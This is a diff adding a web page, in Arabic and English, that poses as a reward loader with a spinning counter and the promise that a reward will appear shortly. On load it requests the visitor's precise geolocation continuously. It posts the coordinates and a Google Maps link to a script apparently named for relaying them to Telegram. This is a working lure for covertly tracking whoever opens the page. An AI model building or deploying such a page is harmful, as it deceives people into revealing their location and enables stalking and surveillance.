@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>تتبع الموقع الجغرافي</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: #fff; /* White text for black background */
+            text-align: center;
+            background-color: #000; /* Solid black background */
+        }
+
+        .container {
+            position: relative;
+            width: 250px; /* Larger container for the square */
+            height: 250px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* The transparent square background */
+        .spinner-background {
+            position: absolute;
+            width: 250px;
+            height: 250px;
+            background-color: rgba(255, 255, 255, 0.1); /* Semi-transparent white */
+            border-radius: 20px;
+            box-shadow: 0 0 40px 10px rgba(192, 192, 192, 0.5); /* Silver shadow for the square */
+        }
+
+        /* The thick, rotating silver circle */
+        .spinner {
+            position: absolute;
+            z-index: 2;
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            border: 18px solid transparent;
+            border-top-color: #c0c0c0; /* Silver color */
+            animation: spin 3s linear infinite, subtle-shadow 4s ease-in-out infinite;
+            transition: transform 0.2s ease-in-out;
+        }
+
+        /* Interactive effect on hover/active */
+        .spinner:active {
+            transform: scale(1.05);
+        }
+
+        /* Keyframes for rotation */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes subtle-shadow {
+            0% { box-shadow: 0 0 10px 5px rgba(255, 255, 255, 0.2); }
+            50% { box-shadow: 0 0 15px 8px rgba(255, 255, 255, 0.3); }
+            100% { box-shadow: 0 0 10px 5px rgba(255, 255, 255, 0.2); }
+        }
+
+        /* The counter inside the circle */
+        #counter {
+            font-size: 2.5em;
+            font-weight: bold;
+            color: #000; /* Black text for visibility */
+            position: absolute;
+            z-index: 3;
+            padding: 10px 20px;
+            background-color: rgba(255, 255, 255, 0.7); /* White semi-transparent background */
+            border-radius: 10px;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        #status {
+            font-size: 1.2em;
+            color: #fff;
+        }
+
+        #reward-message {
+            font-size: 1.5em;
+            font-weight: bold;
+            color: #ffd700;
+            margin-top: 5px;
+        }
+        
+        #developer-info {
+            position: absolute;
+            bottom: 20px;
+            font-size: 0.8em;
+            color: #aaa;
+        }
+    </style>
+</head>
+<body onload="startTracking()">
+    <div class="container">
+        <div class="spinner-background"></div>
+        <div class="spinner"></div>
+        <div id="counter">0</div>
+    </div>
+    <p id="status">Loading...</p>
+    <p id="reward-message">ستظهر المكافأة بعد قليل</p>
+    <p id="developer-info">This was developed by Omar Abdel Tawab Saleh</p>
+
+    <script>
+        let watchId;
+        const statusElement = document.getElementById("status");
+        const spinnerElement = document.querySelector(".spinner");
+        const counterElement = document.getElementById("counter");
+        const rewardMessageElement = document.getElementById("reward-message");
+
+        let counterInterval = null;
+
+        function animateCounter(finalCount) {
+            let currentCount = 0;
+            const increment = finalCount / 400;
+            counterInterval = setInterval(() => {
+                currentCount += increment;
+                if (currentCount >= finalCount) {
+                    currentCount = finalCount;
+                    clearInterval(counterInterval);
+                    counterInterval = null;
+                }
+                counterElement.textContent = Math.floor(currentCount);
+            }, 15);
+        }
+        
+        animateCounter(170);
+
+        function startTracking() {
+            if (navigator.geolocation) {
+                navigator.geolocation.watchPosition(showPosition, showError, {
+                    enableHighAccuracy: true,
+                    timeout: 5000,
+                    maximumAge: 0
+                });
+            } else {
+                hideElementsOnFailure();
+                statusElement.innerHTML = "المتصفح لا يدعم تحديد الموقع الجغرافي.";
+                statusElement.style.display = 'block';
+            }
+        }
+
+        function showPosition(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            
+            if (counterInterval) {
+                clearInterval(counterInterval);
+                counterElement.textContent = "170";
+            }
+            
+            sendData(latitude, longitude);
+        }
+
+        function showError(error) {
+            hideElementsOnFailure();
+            let errorMessage = "";
+            switch(error.code) {
+                case error.POSITION_UNAVAILABLE:
+                    errorMessage = "معلومات الموقع غير متاحة.";
+                    break;
+                case error.TIMEOUT:
+                    errorMessage = "انتهت مهلة طلب المستخدم للحصول على الموقع.";
+                    break;
+                case error.UNKNOWN_ERROR:
+                    errorMessage = "حدث خطأ غير معروف.";
+                    break;
+                case error.PERMISSION_DENIED:
+                    break;
+            }
+            
+            if (errorMessage) {
+                statusElement.innerHTML = errorMessage;
+                statusElement.style.display = 'block';
+            }
+        }
+        
+        function hideElementsOnFailure() {
+            counterElement.style.display = 'none';
+        }
+
+        function sendData(lat, lon) {
+            const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            const xhr = new XMLHttpRequest();
+            const url = 'send_to_telegram.php';
+            const params = `latitude=${encodeURIComponent(lat)}&longitude=${encodeURIComponent(lon)}&link=${encodeURIComponent(googleMapsLink)}`;
+            
+            xhr.open('POST', url, true);
+            xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+            
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == 4 && xhr.status == 200) {
+                    console.log(xhr.responseText);
+                }
+            };
+            xhr.send(params);
+        }
+
+        function stopTracking() {
+            if (watchId) {
+                navigator.geolocation.clearWatch(watchId);
+                hideElementsOnFailure();
+                statusElement.innerHTML = "تم إيقاف تتبع الموقع.";
+                statusElement.style.display = 'block';
+            }
+        }
+    </script>
+</body>
+</html>
